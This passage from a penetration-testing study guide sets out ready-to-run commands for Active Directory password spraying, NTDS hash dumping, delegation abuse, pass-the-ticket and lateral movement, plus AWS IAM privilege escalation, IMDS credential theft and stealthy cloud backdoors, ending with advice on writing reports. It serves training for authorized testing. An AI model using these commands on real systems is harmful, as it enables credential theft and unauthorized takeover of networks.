15.9.4 kerbrute

Sprays via Kerberos pre-auth — faster and quieter than LDAP spraying; also useful for username enumeration (KDC_ERR_C_PRINCIPAL_UNKNOWN = invalid user). The executable is on the kerbrute GitHub (see Section 18.3.2.2).

# Password spray via Kerberos pre-auth
.\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt "[password]"

15.10 Shadow Copies

Abuse VSS snapshots to extract NTDS.dit and the SYSTEM hive from a DC offline — no DCSync required, just local admin.

Method Precondition Key Command OPSEC Noise
Create new VSS snapshot (vshadow.exe) Local admin / SYSTEM on DC vshadow.exe -nw -p C: High — Event ID 8193/7001 logged
Browse existing shadow copy Shadow copy already present; read access mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX Low — no new VSS events
NTDSUTIL IFM Local admin / SYSTEM on DC; ntdsutil available ntdsutil "ac i ntds" "ifm" "create full C:\ifm" q q Medium — Event ID 325/326; leaves IFM folder on disk
Remote DCSync (Mimikatz / secretsdump) Domain Admin or DS-Replication-Get-Changes-All rights secretsdump.py domain/admin:pass@dc-ip High — replication events (Event ID 4662) visible on DC 
# Create a shadow copy of C: — note the shadow copy device path in output
vshadow.exe -nw -p C:

# Copy NTDS from the shadow copy (replace X with the shadow copy number)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\ntds.dit.bak

# Save the SYSTEM hive
reg.exe save hklm\system C:\system.bak
# Extract hashes on Kali
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
# Extract on-box with Mimikatz
lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
# List all shadow copies
vssadmin list shadows

# Mount an existing shadow copy as a folder (replace X with number)
mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX

# Browse the mounted copy
dir C:\ShadowCopy

15.11 Constrained Delegation Attack

If you compromise a service or machine account with msDS-AllowedToDelegateTo set, use S4U2Self + S4U2Proxy to request service tickets on behalf of any domain user — including Domain Admins — for the permitted SPNs.

  • S4U2Self gets a forwardable TGS for any user without knowing their password; S4U2Proxy presents it to the target SPN — all via the delegating account's TGT.
  • Kerberos does not validate the sname field at the target; a ticket for cifs/dc.domain.com can be rewritten to host/dc.domain.com using Rubeus /altservice.
  • For RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity on the target (via GenericWrite) pointing to an attacker-controlled machine account, then run the S4U chain.
Delegation Type AD Flag / Attribute Scope of Impersonation Primary Abuse Key Tool
Unconstrained TRUSTED_FOR_DELEGATION UAC flag Any service, any user; receives full TGTs from connecting users Capture incoming TGTs with Rubeus monitor / SpoolSample (printer bug) to coerce DC TGT then DCSync Rubeus.exe monitor, SpoolSample, Mimikatz kerberos::ptt
Constrained (KCD) msDS-AllowedToDelegateTo + optionally TrustedToAuthForDelegation Specific SPNs only; S4U2Self + S4U2Proxy chain Impersonate any domain user (incl. DA) to listed SPNs; sname swap to reach additional services getST.py, Rubeus.exe s4u
Resource-Based Constrained (RBCD) msDS-AllowedToActOnBehalfOfOtherIdentity on target Specific source → specific target; configured on the resource, not the delegator Write attribute via GenericWrite/GenericAll, point to attacker-controlled machine account, run S4U chain for SYSTEM on target PowerMad (new machine account), getST.py, Rubeus.exe s4u 
# Find accounts with delegation configured
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Find computers with SPNs
Get-ADComputer -Filter {ServicePrincipalName -like "*"} -Property ServicePrincipalName | Select-Object Name,ServicePrincipalName

# Check allowed delegation targets for a service account
Get-ADUser -Identity [ServiceAccount] -Properties msDS-AllowedToDelegateTo
# S4U2Self + S4U2Proxy via Impacket — produces a .ccache usable with any Impacket tool
getST.py -spn cifs/dc.[domain].com -impersonate Administrator [domain]/[svcaccount]:[password]
export KRB5CCNAME=./Administrator.ccache
# S4U chain via Rubeus — completes both S4U steps and injects the ticket
Rubeus.exe s4u /user:[svcaccount] /rc4:[hash] /impersonateuser:Administrator /msdsspn:cifs/dc.[domain].com /ptt
# RBCD — step 1: create a new machine account (PowerMad)
New-MachineAccount -MachineAccount FakePC -Password Password123
# RBCD — step 2: write msDS-AllowedToActOnBehalfOfOtherIdentity on target (via GenericWrite)
# then step 3: run S4U chain for CIFS on target
getST.py -spn cifs/[target].[domain].com -impersonate Administrator -dc-ip [dc_ip] [domain]/FakePC$:Password123

15.12 Enum, Creds Spraying, and Post-Enum Techniques

Scan, enumerate, spray, then exploit — retrieve the password policy before spraying to avoid lockouts.

Port Service Description
88KerberosAuthentication service for AD.
135MSRPCMicrosoft RPC.
139NetBIOSFile/printer sharing.
389LDAPDirectory services.
445SMBFile sharing / admin shares.
636LDAPSSecure LDAP.
3268LDAP GCLDAP Global Catalog.
3389RDPRemote Desktop Protocol.
5985WinRMWindows Remote Management.
Phase Goal Primary Tool(s) Key Output / Indicator
Port Scan Identify exposed AD services nmap -p 88,135,389,445,5985 -sC -sV -Pn Open ports confirm DC; missing port 88 = not a DC
SMB / RPC Enum Usernames, shares, password policy enum4linux -a, rpcclient -U "" -N Lockout threshold, user list, domain SID
LDAP Enum Full object/attribute dump ldapsearch -x, ldapdomaindump Naming context, user/group membership, ACLs
AS-REP Roasting Offline hash from pre-auth disabled accounts GetNPUsers.py, Rubeus asreproast $krb5asrep$23$ hash — crack with hashcat -m 18200
Credential Spray Valid domain credentials crackmapexec smb, kerbrute passwordspray (Pwned!) or STATUS_SUCCESS in output
Kerberoasting TGS hashes for SPN accounts GetUserSPNs.py, Rubeus kerberoast $krb5tgs$23$ hash — crack with hashcat -m 13100
BloodHound Collection Graph-based attack path analysis bloodhound-python, SharpHound.exe Shortest path to DA, delegation edges, AdminTo
Hash Dump / DCSync All domain hashes secretsdump.py, Mimikatz lsadump::dcsync NTLM hashes for every domain account 
# 1. Port scan
nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [ip]
# 2. SMB / RPC enumeration
enum4linux -a [ip]

rpcclient -U "" -N [ip]
# 3. LDAP enumeration
ldapsearch -x -h [ip] -b "DC=[domain],DC=[tld]"
# 4. Credential spray (SMB)
crackmapexec smb [ip] -u [users_file].txt -p '[password]' -d [domain] --continue-on-success
# 5. Dump hashes once admin credentials are known
secretsdump.py [domain]/[user]:[password]@[ip]
# 6. PowerView post-enum
Get-ADUser -Filter * | Select-Object Name, SamAccountName
Get-ADGroupMember -Identity "Domain Admins"
Find-DomainShare -Writable
Find-InterestingDomainAcl
# Capture NTLMv2 hashes via LLMNR/NBT-NS
responder -I eth0
# RDP NTLM info leak
nmap -p 3389 --script rdp-ntlm-info [ip]
# WinRM execution
crackmapexec winrm [ip] -u [user] -p [password] --exec-method invoke_command

References: HackTricks - Active Directory — PayloadsAllTheThings — Impacket

15.13 Pass-the-Ticket (PtT)

Steal a Kerberos TGT from LSASS memory and inject it into your session to authenticate as the ticket owner across the domain — no password needed. Requires SYSTEM or local admin on the host where the target user has an active logon session.

  • TGTs expire after 10 hours by default (renewable up to 7 days); renew near-expiry tickets with Rubeus.exe renew /ticket:[base64].
  • PtT works over Kerberos only; PtH works over NTLM — prefer PtT in environments with NTLMv2 restrictions.
  • Golden Tickets forge TGTs using the krbtgt hash; Silver Tickets forge TGS for a specific service; PtT reuses a legitimately issued ticket — least noisy of the three.
  • Members of the Protected Users group cannot have tickets delegated or cached; Credential Guard blocks LSASS reads on protected hosts.
Requirement Description
Active TGT in Memory A valid TGT from a privileged user must be present — e.g. cached by a Domain Admin who logged in earlier.
SYSTEM Privileges Needed to access LSASS memory where Kerberos tickets are stored.
Local Administrator Often sufficient — allows escalation to SYSTEM or direct LSASS access via tools.
Step Action Tool (Windows) Tool (Linux / Kali) Notes
1. Escalate to SYSTEM Gain SYSTEM or SeDebugPrivilege to read LSASS privilege::debug in Mimikatz; or Rubeus.exe triage N/A (performed on Windows target) Local admin is often enough; Credential Guard blocks LSASS reads
2. List tickets Identify TGTs owned by high-privilege accounts sekurlsa::tickets or Rubeus.exe triage klist if already on a domain-joined Linux host Look for [T] flag and non-expired start/end times
3. Export ticket Write TGT to disk or capture as base64 sekurlsa::tickets /export → .kirbi files; or Rubeus.exe dump /nowrap Copy .kirbi / base64 blob to Kali Each .kirbi file corresponds to one cached ticket
4. Convert (Kali only) Convert .kirbi to .ccache for Linux tools N/A kirbi2ccache ticket.kirbi > ticket.ccache Impacket and MIT Kerberos use .ccache format
5. Inject ticket Load ticket into current session kerberos::ptt ticket.kirbi or Rubeus.exe ptt /ticket:[base64] export KRB5CCNAME=./ticket.ccache Verify with klist; Windows injects into current LUID
6. Lateral movement Authenticate as impersonated user to target services Enter-PSSession, wmic, mstsc psexec.py -k -no-pass, evil-winrm -k, wmiexec.py -k Use target hostname (not IP) so Kerberos SPN resolves correctly 
# Extract and inject tickets with Mimikatz
privilege::debug
sekurlsa::tickets
sekurlsa::tickets /export

# Inject the stolen TGT into your current session
kerberos::ptt C:\path\to\[ticket].kirbi

# Verify the ticket is loaded
klist
# Lateral movement from Windows with injected ticket
wmic /node:[target_host] process call create "cmd.exe"

Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential [domain]\[username]
# Convert .kirbi to .ccache and export for Impacket tools
kirbi2ccache [ticket_file].kirbi > [ticket_file].ccache
export KRB5CCNAME=./[ticket_file].ccache
# Lateral movement from Kali using the injected ticket
psexec.py -k -no-pass [domain]/[username]@[target_host]

evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]

wmiexec.py -k -no-pass [domain]/[username]@[target_host]

16. Active Directory Lateral Movement

Move laterally through AD by reusing credentials, NTLM hashes, or Kerberos tickets to pivot between systems.

Method Port(s) Privilege / Context Auth Support Noise / Key Artifacts Best Used When
PsExec (Sysinternals / impacket) TCP 445 (SMB) Local Admin required; shell returns as SYSTEM Password, NTLM hash, Kerberos ticket Very noisy — Event ID 7045 (service install), binary dropped to ADMIN$, well-known PSEXESVC name triggers AV/EDR You need a SYSTEM shell quickly and detection risk is low; not recommended on monitored targets
WMIExec (impacket / wmiexec.py) TCP 135 + dynamic RPC (49152–65535) Local Admin or DCOM Users; shell runs as authenticated user (not SYSTEM) Password, NTLM hash, Kerberos ticket Moderate — Event ID 4688 (process creation via WMI), temporary ADMIN$ share for output; no service creation Stealth over SYSTEM context; firewall must allow dynamic RPC ports
SMBExec (impacket / CME --exec-method smbexec) TCP 445 (SMB) Local Admin required; shell returns as SYSTEM Password, NTLM hash Moderate-high — creates a temporary service per command, writes a batch script; service name is random but pattern is detectable Alternative to PsExec when PSEXESVC is blocked; each command is a separate service creation/deletion cycle
atexec (impacket) TCP 445 (SMB) Local Admin required; runs as SYSTEM via Task Scheduler Password, NTLM hash Moderate — Event ID 4698/4702 (scheduled task created/modified); output written to a share then retrieved Non-interactive single-command execution; useful when interactive shells are not needed
WinRM / Evil-WinRM TCP 5985 (HTTP) / 5986 (HTTPS) Remote Management Users or local Admin; shell runs as authenticated user Password, NTLM hash, Kerberos ticket, certificate Low-moderate — Event IDs 4624/4688; common sysadmin protocol, blends in; PowerShell ScriptBlock logging (4104) captures commands if enabled Interactive PowerShell sessions; must be enabled on target (default off on workstations)
DCOM (direct COM / Invoke-Command) TCP 135 + dynamic RPC Local Admin or explicit DCOM launch/access ACL; context varies by COM class Password, Kerberos ticket Low — COM activation events; less monitored than service/task creation; dynamic ports complicate detection rules SMB-based methods are blocked or too noisy; target has DCOM-accessible classes (default on all modern Windows)
WMIC (Windows built-in) TCP 135 + dynamic RPC Local Admin required; spawned process runs as authenticated user, detached (no console) Password (explicit /user//password) Low — signed Microsoft binary (LOLBIN), WMI-Activity/Operational log; no interactive shell, output not captured without redirection Dropping a payload or scheduled task non-interactively; deprecated in Windows 11 but present on most exam targets

16.1 Techniques and Preparation

Overpass-the-Hash converts an NTLM hash into a Kerberos TGT so you authenticate via Kerberos rather than NTLM, bypassing NTLM-blocking defenses.

  • Impacket tools (psexec.py, wmiexec.py) natively accept -hashes LM:NT from Kali — no Windows-side tool needed.
  • A TGT (from Overpass-the-Hash / AS-REP) works for any service; a Silver Ticket targets one specific service and never touches the DC.
  • After obtaining a TGT via sekurlsa::pth, run klist in the spawned shell to confirm the ticket is present before pivoting.
# Execution Policy bypass
powershell -ExecutionPolicy Bypass -File [script].ps1

# Overpass-the-Hash — convert NTLM hash to Kerberos TGT
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell

# From the spawned PowerShell session, pivot to another host
.\PsExec.exe \\<target_system> cmd

16.2 From Kali

Impacket and Evil-WinRM implement Windows auth natively — no Windows environment required.

evil-winrm

# Password auth
evil-winrm -u <username> -p <password> -i <target_ip>

# NTLM hash (pad LM with zeros if unknown)
evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>

psexec.py

# Password auth
impacket-psexec <username>:<password>@<target_ip>

# NTLM hash
impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:<NTLM_hash>

wmiexec.py

# Password auth
impacket-wmiexec <username>:<password>@<target_ip>

# NTLM hash
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>

16.3 From Windows

Native OS features for lateral movement — reduces binary transfers and blends with legitimate admin activity.

dcomexec

# Verify DCOM is enabled
Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"

# Execute via Invoke-Command with explicit credentials
$secureString = ConvertTo-SecureString "<password>" -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential("<username>", $secureString)
Invoke-Command -ComputerName <target_ip> -Credential $credential -ScriptBlock { ipconfig }

psexec.exe (Sysinternals)

psexec.exe \\<target_ip> -u <domain\username> -p <password> cmd
psexec.exe \\<target_ip> -accepteula cmd

winrs

winrs -r:<target_ip> -u:<username> -p:<password> "<command>"

New-PSSession / Invoke-Command (WinRM)

$secureString = ConvertTo-SecureString "<password>" -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential "<username>", $secureString
$s = New-PSSession -ComputerName <target_ip> -Credential $credential
Invoke-Command -Session $s -ScriptBlock { whoami }

wmic

wmic /node:<target_ip> /user:<username> /password:<password> process call create "<command>"

16.4 Credential Spraying with CrackMapExec

Spray credentials or hashes across SMB, WinRM, LDAP, MSSQL, RDP, FTP, SSH, and HTTP. Reference: CrackMapExec GitHub. The actively maintained fork is NetExec (nxc) — syntax is nearly identical.

  • Always query the domain lockout policy before spraying — exceeding the threshold locks accounts domain-wide.
  • --local-auth tests local SAM accounts; less monitored and credential reuse is common across hosts.
  • [+] = valid credentials; (Pwn3d!) = local admin rights confirmed.
  • smbexec writes a service to disk (noisier, returns SYSTEM); wmiexec is fileless via WMI (quieter, returns user context).
Protocol CME Keyword Default Port Auth Types Supported What (Pwn3d!) Means Common Next Step
SMB smb TCP 445 Password, NTLM hash, Kerberos ticket Local admin rights on the target host Shell via -x or --exec-method; share enumeration with --shares
WinRM winrm TCP 5985/5986 Password, NTLM hash Account in Remote Management Users or local admin Interactive shell via Evil-WinRM; command execution via -x
LDAP ldap TCP 389 / 636 (LDAPS) Password, NTLM hash, Kerberos ticket Successful bind (admin implied by group membership) User/group enumeration (--users, --groups); Kerberoasting (-M kerberoasting)
MSSQL mssql TCP 1433 Password, NTLM hash, Windows auth SA or sysadmin role on the SQL instance OS command execution via xp_cmdshell (-x); linked-server pivoting
RDP rdp TCP 3389 Password, NTLM hash Account can authenticate to RDP Interactive RDP session via xfreerdp or rdesktop
FTP ftp TCP 21 Password Successful FTP login File enumeration/upload; check for writable roots
SSH ssh TCP 22 Password, key Successful SSH login Interactive shell; pivot via SSH tunneling
HTTP http TCP 80/443 Password (Basic/NTLM) Successful HTTP auth Web application enumeration; credential reuse on web panels 
# Check lockout policy before spraying
rpcclient -U "" <DOMAIN_IP> -c "getdompwinfo"

# Scan lateral movement ports
nmap -p 5985,1433,445,3389 <TARGET_IP>
# SMB — single password spray with delay
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p <PASSWORD> --spray --delay 5

# SMB — multi-password spray
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5

# SMB — local accounts
crackmapexec smb <IP> -u local_users.txt -p <PASSWORD> --local-auth

# SMB — command execution (password)
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# SMB — command execution (NTLM hash)
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"

# SMB — target multiple IPs from list
crackmapexec smb <IP_list>.txt -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
# WinRM — spray with password
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --spray --delay 5

# WinRM — spray with NTLM hash
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --spray --delay 5

# WinRM — command execution
crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "ipconfig"

# WinRM — local accounts
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
# SMBExec — shell via service creation
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method smbexec
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method smbexec
# WMIExec — shell via WMI
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method wmiexec
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method wmiexec
# LDAP — main domain
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>

# LDAP — subdomain
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
# MSSQL — domain
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>

# MSSQL — local accounts
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
# RDP — domain
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>

# RDP — local accounts
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
# FTP
crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>

# SSH
crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>

# HTTP
crackmapexec http <TARGET_IP> -u <USERNAME> -p <PASSWORD>

17. AWS Cloud Enumeration

Cloud recon and exploitation are part of the modern syllabus. The pattern: discover assets from the outside (DNS, certificates, public S3 buckets, exposed APIs), then with credentials inside, scope IAM permissions and walk the resource graph.

17.1 Reconnaissance From the Internet

# Subdomain takeovers and CDN fingerprints
amass enum -passive -d example.com
subfinder -d example.com -silent

# Service-specific patterns hint at AWS:
# - elb.amazonaws.com, cloudfront.net, s3.amazonaws.com in DNS
# - x-amz-* headers, AWS request IDs in responses

# Public S3 bucket discovery
aws s3 ls s3://example-prod --no-sign-request
aws s3 ls s3://example-backups --no-sign-request

# Find account IDs from public buckets
curl -s -I https://example-prod.s3.amazonaws.com/
# Look for "x-amz-bucket-region" + use aws-cli with --debug to leak the account ARN

17.2 AWS CLI Setup

# Profile per identity (don't put creds in env vars)
aws configure --profile audit
# AWS Access Key ID:     AKIA...
# AWS Secret Access Key: ...
# Default region:        us-east-1
# Default output:        json

# Identity check
aws sts get-caller-identity --profile audit
aws iam get-account-summary --profile audit       # may fail without iam:* perms

17.3 IAM Enumeration

# Who am I + what can I do?
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name <u>
aws iam list-user-policies         --user-name <u>
aws iam list-groups-for-user        --user-name <u>

# Enumerate roles + their trust relationships (cross-account paths)
aws iam list-roles --query 'Roles[].[RoleName,AssumeRolePolicyDocument]'

# Policies (managed + inline) attached to a role
aws iam list-attached-role-policies --role-name <r>
aws iam list-role-policies          --role-name <r>
aws iam get-role-policy --role-name <r> --policy-name <p>

# Find effective permissions for a specific principal
aws iam simulate-principal-policy --policy-source-arn <arn> --action-names s3:GetObject ec2:RunInstances

17.4 Resource Enumeration

# S3
aws s3api list-buckets
aws s3api get-bucket-policy --bucket <b>
aws s3api get-bucket-acl    --bucket <b>
aws s3 cp s3://<b>/path local/ --recursive

# EC2
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,PublicIpAddress,IamInstanceProfile.Arn,Tags]'
aws ec2 describe-security-groups
aws ec2 describe-key-pairs

# Lambda
aws lambda list-functions
aws lambda get-function --function-name <fn>          # returns code URL

# Secrets Manager / SSM
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <arn>
aws ssm describe-parameters --query 'Parameters[].[Name,Type]'
aws ssm get-parameter --name /prod/db/password --with-decryption

17.5 Automated Enumeration (Pacu)

# Open-source AWS exploitation framework (Rhino Security Labs)
pacu
# > import_keys audit
# > run iam__enum_users_roles_policies_groups
# > run iam__enum_permissions
# > run iam__privesc_scan
# > run s3__download_bucket --bucket <name>

17.6 JMESPath for Big Responses

# Filter, project, join nested JSON on the CLI
aws ec2 describe-instances --query \
  'Reservations[].Instances[?State.Name==`running`].[InstanceId,PublicIpAddress,Tags[?Key==`Name`]|[0].Value]'
aws iam list-users --query 'Users[?contains(UserName, `admin`)].UserName'

18. AWS Cloud Exploitation

Once inside, the wins are: leaked secrets in Git or S3, overly permissive IAM trust policies, dependency-chain attacks against build pipelines, and lateral movement via assumed roles.

18.1 Leaked Secrets

# Hunt for keys in S3 buckets, Git repos, container images
gitleaks detect --source ./ --report-format json --report-path leaks.json
trufflehog s3 --bucket=<b>
trufflehog git https://github.com/example/repo

# Check git history for removed-but-not-purged secrets
git log -p --all | grep -i 'AKIA\|aws_secret\|PRIVATE KEY'

# Validate a found key
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity

18.2 IAM Privilege Escalation

# Classic IAM privesc primitives (look for any one of these via Pacu / manually):
# iam:CreateAccessKey            -> create a key for another user
# iam:UpdateAssumeRolePolicy     -> add yourself to a role's trust policy
# iam:PassRole + lambda:Create   -> create Lambda running as a high-priv role
# iam:AttachUserPolicy           -> attach AdministratorAccess to self
# iam:PutUserPolicy              -> attach inline policy granting *
# sts:AssumeRole                 -> jump into a more privileged role

# Example: attach admin policy to yourself
aws iam attach-user-policy --user-name <me> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

18.3 Poisoning the Build Pipeline

# Common path:
# 1. Compromise a Jenkins/CI account or a Git push key.
# 2. Modify a Jenkinsfile or workflow YAML to run code as the build agent's role.
# 3. The build runs with an EC2/Container instance profile that has AdministratorAccess or
#    cross-account AssumeRole rights you can exfil.

# Identify which IAM role the build agent uses
curl http://169.254.169.254/latest/meta-data/iam/info
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

18.4 Dependency-Chain Attacks

# Typosquat / dependency-confusion: upload a malicious package with the same name as an
# internal-only package; the build pulls yours instead. Detection patterns:
# - Internal package names referenced in lockfiles that aren't on the public index
# - Pre/post-install scripts that exfiltrate environment variables

# package.json hook
# "scripts": { "preinstall": "node -e \"require('https').get(...)\"" }

# Validate detection by inspecting the package install logs in the CI run output.

18.5 IMDS / Instance Profile Theft

# From SSRF on an EC2 instance with IMDSv1 enabled
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# IMDSv2 (token-required) bypass needs PUT then GET
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

18.6 Cloud Persistence

# Stealthy backdoors:
# - Add a second access key under a benign-looking IAM user
# - Create an OIDC identity provider trusting your account
# - Cross-account AssumeRole grant
# - Lambda that re-creates your access on a schedule

aws iam create-access-key --user-name <u>          # leaves a CloudTrail entry
aws iam create-user --user-name svc-backups       # blend in with service accounts

19. Reports Writing

Documentation is a first-class activity — the report is the primary deliverable the client, management, and auditors act on.

19.1 Tools for Note-Taking and Report Writing

For a broader collection see this GitHub collection.

  • Sublime Text — text editor with syntax highlighting.
  • CherryTree — hierarchical notes with rich text and syntax highlighting.
  • Obsidian — Markdown-based with plugin support for linked notes.
  • Flameshot — screenshot tool with annotation features.
  • Joplin — open-source, encrypted, cross-device note sync.
  • KeepNote — organizes findings in a structured tree format.
  • LaTeX — customizable professional layouts for technical documents.
  • MS Word / Google Docs — collaborative tools with template support.
  • Organize by severity (Critical / High / Medium / Low) from the start.
  • Write in Markdown for easy conversion to HTML or PDF.
  • Use Git to version-control drafts.
  • Use standardized templates per assessment type.
  • Log commands and output immediately — memory is unreliable after a long engagement.
  • Timestamp key events (initial access, escalation, data access) for the report timeline.
  • Keep a separate scratch section for raw recon and a clean findings section formatted for the report.
  • Back up to an encrypted location at least once per day.
  • Name artifacts with a consistent convention such as YYYY-MM-DD_host_vuln_desc.ext.
  • Record exact tool versions used (nmap --version, sqlmap --version, etc.).

19.2 Capturing Screenshots

Screenshots are the primary evidence for every finding — capture them early and annotate clearly.

  • Windows — Snipping Tool (Win + Shift + S): rectangular, free-form, window, and full-screen.
  • Windows — Snagit: advanced capture with annotations, callouts, and sharing.
  • macOS — Cmd + Shift + 3 full screen, Cmd + Shift + 4 selected area, Cmd + Shift + 5 options panel.
  • Kali Linux — gnome-screenshot: full screen, window, or selected area.
  • Flameshot (cross-platform) — annotations, blur for sensitive data, direct upload.
  • Shutter (Linux) — rich editing and management features.
  • Annotate with arrows, highlights, and labels to call out the specific issue.
  • Use descriptive file names like sql_injection_login_form.png.
  • Compress images before embedding in PDFs while keeping them legible.
  • Always include surrounding context (URL bar, hostname, username, date/time) so the image is self-evidencing.
  • Capture before and after for destructive or state-changing steps.
  • Blur or redact real credentials, PII, or sensitive business data.
  • Use script (Linux) or PowerShell transcript logging as a timestamped supplement to screenshots.
  • Label multiple screenshots per finding sequentially (e.g., Fig 3a, 3b, 3c).

19.3 Key Components of a Good Report

Every effective pentest report shares the same core structure regardless of scope or client.

  • Executive Summary — high-level overview for non-technical stakeholders, focused on business impact.
  • Scope and Methodology — engagement boundaries and testing approach (black-box, gray-box, etc.).
  • Finding Severity Levels — vulnerabilities labelled Critical / High / Medium / Low with justification.
  • Proof of Concept (PoC) — reproducible steps, screenshots, or code snippets confirming exploitability.
  • Remediation Recommendations — actionable, prioritized fix steps for each issue.
  • Testing Timeline — chronological log of significant events for audit and correlation with client monitoring.
  • Appendix — raw tool output and extended logs that would break narrative flow in the main body.

The table below maps each report section to its primary purpose and its intended audience:

Report Section Purpose Primary Audience
Executive Summary Summarize overall risk posture and business impact in plain language; frame the engagement outcome at the strategic level. C-suite, board members, non-technical decision-makers
Scope & Methodology Define what was tested, what was excluded, the testing type (black/gray/white-box), and the timeline; protect tester and client legally. Legal, compliance officers, third-party auditors
Summary Findings Table Provide a one-page at-a-glance view of all findings with title, severity, and affected component; enable rapid triage prioritization. Management, project managers, remediation team leads
Detailed Findings (per vulnerability) Document each vulnerability with description, impact, PoC steps, and remediation guidance in a self-contained, reproducible format. Security engineers, developers, system administrators
Proof of Concept (PoC) Confirm exploitability with reproducible steps and evidence; give the blue team a way to verify fixes are effective. Security engineers, developers
Remediation Recommendations Deliver specific, prioritized, actionable fix instructions — the core deliverable that justifies engagement cost. Developers, system administrators, DevSecOps teams
Compliance Mapping (optional) Tie findings to specific regulatory controls (PCI DSS, GDPR, NIST, ISO 27001) so the client can present evidence to auditors. Compliance officers, legal teams, external auditors
Testing Timeline Chronological log of key events during testing; demonstrates rigor and allows correlation with client-side monitoring logs. Security operations, incident response, auditors
Appendix Hold raw tool output, extended logs, and supporting data without breaking narrative flow; enables deep-dive audit of methodology. Security engineers, auditors who require raw evidence

19.4 Report Formatting

Consistent formatting builds credibility and makes findings easier to act on.

  • Use clean, legible fonts: Arial, Calibri, or Helvetica.
  • Maintain a consistent heading hierarchy for titles, sections, and subsections.
  • Include a table of contents for longer reports.
  • Use syntax-highlighted code blocks (Prism.js, highlight.js).
  • Include a cover page (client name, date, classification label) and page numbers.
  • Use consistent severity color-coding throughout: red = Critical, orange = High, yellow = Medium, blue = Low.
  • Place a summary findings table near the front for quick at-a-glance review.
  • Apply a classification banner (e.g., CONFIDENTIAL — CLIENT NAME ONLY) to every page header or footer.
  • Use adequate white space between sections to reduce cognitive load.

19.5 Proof of Concept (PoC)

A solid PoC removes doubt that a vulnerability is real and gives the remediation team exactly what they need to reproduce and verify a fix.

